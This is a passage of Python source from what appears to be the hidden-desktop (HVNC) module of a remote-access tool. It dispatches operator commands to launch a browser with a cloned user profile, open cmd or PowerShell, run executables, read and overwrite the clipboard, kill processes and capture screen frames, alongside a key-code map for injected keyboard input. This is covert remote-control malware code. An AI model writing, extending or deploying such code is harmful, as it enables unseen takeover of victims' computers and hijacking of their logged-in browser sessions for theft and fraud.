            "AltLeft": 0xA4, "AltRight": 0xA5,
            "MetaLeft": 0x5B, "MetaRight": 0x5C,
            # Special
            "CapsLock": 0x14,
            "NumLock": 0x90,
            "ScrollLock": 0x91,
            "PrintScreen": 0x2C,
            "Pause": 0x13,
            # Numpad
            "Numpad0": 0x60, "Numpad1": 0x61, "Numpad2": 0x62, "Numpad3": 0x63,
            "Numpad4": 0x64, "Numpad5": 0x65, "Numpad6": 0x66, "Numpad7": 0x67,
            "Numpad8": 0x68, "Numpad9": 0x69,
            "NumpadMultiply": 0x6A, "NumpadAdd": 0x6B,
            "NumpadSubtract": 0x6D, "NumpadDecimal": 0x6E, "NumpadDivide": 0x6F,
            "NumpadEnter": 0x0D,
            # Punctuation
            "Semicolon": 0xBA, "Equal": 0xBB, "Comma": 0xBC,
            "Minus": 0xBD, "Period": 0xBE, "Slash": 0xBF,
            "Backquote": 0xC0, "BracketLeft": 0xDB, "Backslash": 0xDC,
            "BracketRight": 0xDD, "Quote": 0xDE,
        }
        
        return key_map.get(key)
    
    def handle_action(self, action: str, payload: dict) -> dict:
        """Handle HVNC action from operator.
        
        Args:
            action: Action name (without hvnc_ prefix)
            payload: Action payload
            
        Returns:
            Response dict to send back to operator
        """
        handlers = {
            "start": lambda: self.start(),
            "stop": lambda: self.stop(),
            "status": lambda: self.get_status(),
            "start_shell": lambda: self.start_shell(),  # Optional shell start
            "launch_browser": lambda: self.launch_browser(
                payload.get("browser", "chrome"),
                payload.get("clone_profile", True)
            ),
            "launch_cmd": lambda: self.launch_cmd(),
            "launch_powershell": lambda: self.launch_powershell(),
            "launch_explorer": lambda: self.launch_explorer(),
            "run_exe": lambda: self.run_exe(
                payload.get("path", ""),
                payload.get("args", "")
            ),
            "start_process": lambda: self.start_process(
                payload.get("path", ""),
                payload.get("args", "")
            ),
            "get_clipboard": lambda: self.get_clipboard(),
            "send_clipboard": lambda: self.send_clipboard(payload.get("text", "")),
            "kill_process": lambda: self.kill_process(
                payload.get("pid"),
                payload.get("name")
            ),
            "list_processes": lambda: self.list_processes(),
            "get_frame": lambda: self.get_frame(
                payload.get("quality", 50),
                payload.get("scale", 0.5)
            ),
        }
        
        handler = handlers.get(action)
        if handler:
            return handler()
        
        return {
            "action": f"hvnc_{action}",
            "success": False,
            "error": f"Unknown action: {action}"
        }


# Global instance
_hvnc_actions: HVNCActions | None = None


def get_hvnc_actions() -> HVNCActions:
    """Get or create global HVNC actions instance."""
    global _hvnc_actions
    if _hvnc_actions is None:
        _hvnc_actions = HVNCActions()
    return _hvnc_actions


def handle_hvnc_action(action: str, payload: dict) -> dict:
    """Handle HVNC action - convenience function."""
    return get_hvnc_actions().handle_action(action, payload)


def handle_hvnc_control(payload: dict) -> bool:
    """Handle HVNC control command (mouse/keyboard) - convenience function.
    
    Args:
        payload: Control payload with 'type' and input data
        
    Returns:
        True if handled, False otherwise
    """
    return get_hvnc_actions().handle_control(payload)
